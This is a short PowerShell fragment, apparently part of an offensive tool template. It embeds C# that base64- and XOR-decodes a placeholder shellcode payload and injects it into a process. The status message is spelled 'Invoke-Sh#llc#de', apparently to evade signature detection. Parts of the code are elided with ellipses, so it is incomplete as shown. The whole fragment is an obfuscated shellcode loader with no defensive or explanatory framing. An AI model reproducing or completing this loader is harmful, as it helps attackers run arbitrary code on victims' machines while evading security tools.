$Source = @"
      ...
      {
        public static uint Shc(string key, string data)
        {
          byte[] shcode = Zor(Convert.FromBase64String(data), Encoding.UTF8.GetBytes(key));
...
$Code = "~~SHELLCODE~~"
$Length = $Code.Length
$Proc = [~~CLASSNAME~~]::Shc("~~KEY~~",$Code)
Write-Output "[*] Invoke-Sh#llc#de completed: Wrote $Length bytes to process $Proc"
